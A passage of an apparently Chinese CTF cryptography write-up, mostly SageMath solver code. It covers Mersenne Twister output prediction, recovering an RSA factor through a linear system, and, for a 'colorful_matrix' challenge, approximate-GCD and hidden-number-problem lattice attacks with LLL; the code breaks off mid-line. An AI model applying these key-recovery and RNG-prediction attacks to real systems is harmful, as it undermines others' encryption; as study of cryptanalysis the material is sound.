punctuation\">)</span><span class=\"token operator\">==</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">624</span><span class=\"token operator\">+</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>X1<span class=\"token operator\">=</span>rc<span class=\"token punctuation\">.</span>predict_getrandbits<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>X1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>X<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>X1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>R<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>leak<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>M <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    temp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">21</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>        temp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>X<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>j<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    M<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>temp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>M <span class=\"token operator\">=</span> Matrix<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>M<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>R <span class=\"token operator\">=</span> vector<span class=\"token punctuation\">(</span>GF<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>R<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>A <span class=\"token operator\">=</span> M<span class=\"token punctuation\">.</span>solve_right<span class=\"token punctuation\">(</span>R<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>N<span class=\"token operator\">//</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>phi<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>s <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">65537</span><span class=\"token punctuation\">,</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>N<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"colorful_matrix\"><a class=\"markdownIt-Anchor\" href=\"#colorful_matrix\">#</a> colorful_matrix</h2>\n<p>首先要求 p，显然是一个 agcd，然后一个去头去尾的经典 hnp，最后拿 mt19937 预测一下 iv 解密。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># part1</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>N <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">38630062416586710341458654419912504176237737247477839749085033080367529539859992076587411537805430366799412095876782912512744262957062106155418341531142309858429218208463637096843365217114990765965110566415965985105403996944993619708417839598461935470469097206342256014086162845948208599334925650727933097059538199199685364793545286980392966271769914201657672004082101110775504946586957241075964270454872257405872181588544468173017149763827540561921126826597515171761064800381983526515300315517818122598179574900255685121991744205071544970</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41522753602903133841910260331594875922287719226997542592715810409935551768308104573333760854332533376702631593490915962706512143045107096658851885513727202513616813054397657610854303071682604806070009002234312854968365250748142324994926715544722158698813288131533399544263105858513134170084625526223987620550110255872688155827773099232631041345207194483609514502522566888883736218471849075697433311580004701384847571029783514418685068903758509270527252444771313048094566344002411364378658592832008194309873599342916391769027015343562030852</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41542983120532762175372001624404625565366126179958909731196555044290633581761361918706298428954501507557598076910710787422049443564800530253137695341299743714514361560156305534490483794181933110893966453220306980682146624294992100948497284459992930850081254114996830645068636306625330524465991656430799359422407117440063911943625477783216502523414967017151717597372146324488526509879620785458016456593044828784565522423332830549325397893426472247197776412026158371655860380929692662547882654137064941217130915364306358205055760044763651406</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42853015443318352230776688785915441259875645365236808434164117288657978345098324019250085686482568413223085548506789311679316323466083886556772338612177680666217592255234589446979456714341877135596118517098603502394776049958587301113539552072352462301070489369653155854389890761241450743607560719433910573462283304103064437843063566946231984094581307498714742271881862348689297267558023093643893310002803310596286441071314219020032740336515363830250477649030557311461077069407775907176409762823453607196260454965048316567154365877848652918</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31152961872836435078296602982779340735140569916125711058616435902653202922218293684857125091648631460215120167354825278469413413558325850576700866199515219603448136082693185200558425103833947831228064760642508443585470729998592994719564254894176473779555436230174300038353978808432410463449170865897259181312953584408177790825688497584119467820716449210429423337019604137134889051973100340798405991782200038835066294194815913887924272593864934325496116821854183293510325217934617021428710898873475027666892706022106386340733691632884942848</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Q <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>R <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>D <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>t <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    M <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">180</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    L <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    L<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>M<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span>N<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">:</span>t<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> N<span class=\"token punctuation\">[</span>t<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        L<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token operator\">-</span> N<span class=\"token punctuation\">[</span>t<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    L<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> M</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    MQ <span class=\"token operator\">=</span> <span class=\"token builtin\">abs</span><span class=\"token punctuation\">(</span>matrix<span class=\"token punctuation\">(</span>L<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>LLL<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">assert</span>  MQ <span class=\"token operator\">%</span> M <span class=\"token operator\">==</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    Q<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>MQ <span class=\"token operator\">//</span> M<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    t<span class=\"token operator\">+=</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">for</span> n<span class=\"token punctuation\">,</span>q <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">,</span>Q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    R<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> R<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> Q<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>nbits<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>A <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">12789809461864875489953273982997537541385904671489556544122095227619591140533414669794423644619127980362623481580128258914287474542792728686579090501397390</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10463950513938701625808784986819665844287315724639315128677227520960105897990256530542006653611594269012930935073966767351788182657861624733138283749460454</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5253244650607533810967862436125419800679723144526973463211784033045021824966560017919956773745212139142517766154626849426827164032731516615725539069585525</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5644589184984504085855423002268477365020278981591337230721358313393863912025011466727192648804002734561676112555123877764178690726130713927642577324443238</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4231732567865883627242742552738439372803539125622706171540910152922080004603138662537022248675968288205781990968838888633816697065257733344028576518431020</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2483388920404524165854675814798022834892112957478917588986471421083048888193527751575039626887367465858751417977246719312923814782809309525841102293919541</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3252353812256192711411255830105475125944842449239880454539397067913664088094160819193268643401968970009466652179043139341471403913410402646923633696154454</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11575010486066232687430367040977113580882826853104996856464797182632266635060724100357205810604915010810884387573114266349621457564659060272935537811111850</span><span class=\"token punctuation\">,</span> <span class=\"token number\">116107444921917032985259963199427176510900273385517435613848456370557161312731449337837406563733552524777525870560544042690403987311424820755256727586807</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5859050133610438843641532306693688255014116940390205022708310454673159702673207152462501010791971695002865650407033762568636006764435795015869726867643634</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5954075553161305677556950650395792531753502207483036473422070018485916621872566706504374038792527687442272405589975343003802956899043321092006127828986114</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4571747544457157571652286537158051402285727327066029382085461714597609990601683125994983291866807816649968826930652068427193317966970789937746419206862747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7166507561570980603812241332170524724051295937096000768984168029904561160020043035660087151672164814332446644696618077835020463308343415953131944864257266</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4852042788460566411381271873349329096978244586097817622748766708426751073559942708861852208085367014057217116211249133109246735634468823924185525972777655</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11962941918999276757181090570698839032103646409734781047194175833198626142790676141060052011581957980660140931408560130449153056874213033784715711461403345</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10324508881746579337486319574059121005227580732153432145860775835052420139026016902518605634385512021513380467928195663920843022679549517463264144660593354</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13276257094435850052122403884510025189232513948002582716865201271569293297601525601586036713056700716929820641888489806178376555435219630186396004003438962</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6525051273399089095687950615197786094425890004112675057642687348101531212837185750558500720306108976630502328600886080197626115513445112562084719104488315</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12922888505610354933000354792496863801007995464403098763485264334670452387681468617068312646367483171083114539083453125614861357751571161533921864394641576</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9489726784141062031514945333087338495823600723655465328127755755022980083351477888038160719541864899912899592065620071698977397662002448273876711116012763</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10630316198843195148937849513165933809121991192035364160395429088101265852052098101114542104327663563661384303617672183366879116750889320604308038959012109</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12675564142993964272844760955973914547747654087592111324261755301551267959231076883765863344473167582531968290671984039948163579495803204811731286282708940</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11847724105274460405216443356582445218232627275228120716891711887600046501095390733716854871561352002320819466803698088448952127166615410820121973485089326</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5131676593756685549522564504727003861447389891839469018437277330988047271086971907217360711863971849879439418231726349935396008040776952541710218842744018</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8049060452950901277510497437779182190254362319091882684392717180429468875432078713802857488901441344429723298843967365750616860588029426099852763482179470</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2365060249260571713545479629411006471094806409182638354076861269679377537605360223984548798658469783472746989448405310909017645138161178501458084966625559</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7467521246204465304438401242342633361751371318557249418344587207503257890765643838557008735305668588521988487342275527781708126255070883848829062790678347</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5841608816993144092409175658260479687582056537041472535819914412630519543198558564258699185557903902095773598614097026740427138629173672250387442834578787</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3935779917509948624841228665498558015416911059417306651751360048412619176423173794541812556512582747588138532941031730797102738268660078594473168666677171</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1459083415233950534805962555425717865938763752937036513111696179351002303817986848490146888626704327653287774806488952733813718461674376764427084478395399</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6426876689549337938550615491086475536072547585103523407263007393570982327518298678278232288342601754164640081474537962710401178482959474762541185760732929</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5241364650650467046722868257809607948071188801137204831449976666385482519613365369974704486723941517654753205012497273820309153659423928739972270634209996</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6387483223002092292686097811446217867743566298067033295601210265979889577756648605354064672061975949925472022416479935990178719227937307079186916383092053</span><span class=\"token punctuation\">,</span> <span class=\"token number\">170562164015232424518655058158727202269056868720093972639058422975773575660534168774299548952867348396798580779605954510297102765330549642318362861226163</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10004133230245713370426176448219282796530473722412487408402635996842671302539458739305597027107498342509248085998067976408732789438099488867425813748783724</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12325342879747412722323355648741345730921040452129462974449188258885453690169624888480720109964630270938743431623479816739889661554987977051169401841580388</span><span class=\"token punctuation\">,</span> <span class=\"token number\">641543989928732942291347866597230552820621633110802944556141221591498546555080480758772801043509130524233886009444044150447511986129019395067102094826363</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>B <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">108715652691370707411987210267535348806</span><span class=\"token punctuation\">,</span> <span class=\"token number\">131676833696101475747102644851662113271</span><span class=\"token punctuation\">,</span> <span class=\"token number\">122436706338521558335484593966234623745</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255864866572301552398412638474857375629</span><span class=\"token punctuation\">,</span> <span class=\"token number\">81098761191414480003681301866161112100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">322322463176364397336266169283851913620</span><span class=\"token punctuation\">,</span> <span class=\"token number\">198167679309202772183020662350938553923</span><span class=\"token punctuation\">,</span> <span class=\"token number\">326360662842236388778385468938922853242</span><span class=\"token punctuation\">,</span> <span class=\"token number\">241812832858991643670485138860832357660</span><span class=\"token punctuation\">,</span> <span class=\"token number\">69768236619183466076110136290750715548</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32383134960394164339076842474280712870</span><span class=\"token punctuation\">,</span> <span class=\"token number\">147747232748027508904245311745435517130</span><span class=\"token punctuation\">,</span> <span class=\"token number\">25327826075608705748116808975774398964</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65295332681674581261444632606267440749</span><span class=\"token punctuation\">,</span> <span class=\"token number\">236756211690281667988216748814564193312</span><span class=\"token punctuation\">,</span> <span class=\"token number\">106435149910135092172124474857722935730</span><span class=\"token punctuation\">,</span> <span class=\"token number\">270727089812520941022075406571244846193</span><span class=\"token punctuation\">,</span> <span class=\"token number\">206881193220261276126028739930244917728</span><span class=\"token punctuation\">,</span> <span class=\"token number\">131961838897694897398340205404861333362</span><span class=\"token punctuation\">,</span> <span class=\"token number\">219211823942216355573832791993673934321</span><span class=\"token punctuation\">,</span> <span class=\"token number\">150960424777134558142309786444952807101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">51112048255939343109218372373173385772</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182065623911902509203036774197184164110</span><span class=\"token punctuation\">,</span> <span class=\"token number\">168420344895532090057957641972492853410</span><span class=\"token punctuation\">,</span> <span class=\"token number\">301808673225362418769168353084541667053</span><span class=\"token punctuation\">,</span> <span class=\"token number\">132272458662433671393247350648662880688</span><span class=\"token punctuation\">,</span> <span class=\"token number\">495672626901999558635736361346563007</span><span class=\"token punctuation\">,</span> <span class=\"token number\">182444159345379042372018248514964944782</span><span class=\"token punctuation\">,</span> <span class=\"token number\">144584137563407779776361378564517880036</span><span class=\"token punctuation\">,</span> <span class=\"token number\">338518705859818740467225748906995999694</span><span class=\"token punctuation\">,</span> <span class=\"token number\">205885429741815676881969528495365151019</span><span class=\"token punctuation\">,</span> <span class=\"token number\">233897982464483450790005953366237992668</span><span class=\"token punctuation\">,</span> <span class=\"token number\">279307677123402840425362992920185630901</span><span class=\"token punctuation\">,</span> <span class=\"token number\">133493426228159673166382443820069696429</span><span class=\"token punctuation\">,</span> <span class=\"token number\">316624110847744871475435405969944304329</span><span class=\"token punctuation\">,</span> <span class=\"token number\">187931604382397525131117897387179435812</span><span class=\"token punctuation\">,</span> <span class=\"token number\">220019728924915067987393012581921164417</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">766</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>s1 <span class=\"token operator\">=</span> <span class=\"token number\">238</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>s2 <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>s3 <span class=\"token operator\">=</span> <span class=\"token number\">400</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>q <span class=\"token operator\">=</span> p</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>b2 <span class=\"token operator\">=</span> B</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>T1 <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>s2<span class=\"token operator\">+</span>s3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>T2 <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>s3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>T3 <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>s3<span class=\"token operator\">-</span>s1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>b2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>Aorg <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> A<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>b2org <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> b2<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token comment\">#Z = list(zip(Aorg, b2org))</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token comment\">#Z = list(zip(Aorg, b2org))[:ceil((m-s2)/s2)]</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>Z <span class=\"token operator\">=</span> <span class=\"token builtin\">sorted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>Aorg<span class=\"token punctuation\">,</span> b2org<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> reverse<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>ceil<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>s1<span class=\"token operator\">+</span>s3<span class=\"token punctuation\">)</span><span class=\"token operator\">/</span>s2<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>A <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> Z<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>b2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> Z<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>S <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>m<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token punctuation\">(</span>s3<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\">#S = 0</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>b2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>T2 <span class=\"token operator\">*</span> x <span class=\"token operator\">+</span> S <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> b2<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>AA <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> A<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>bb2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> b2<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token keyword\">for</span> choice <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    A <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> AA<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    b2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>x <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> bb2<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    A0 <span class=\"token operator\">=</span> A<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    A0i <span class=\"token operator\">=</span> A0<span class=\"token punctuation\">.</span>inverse_mod<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    b02 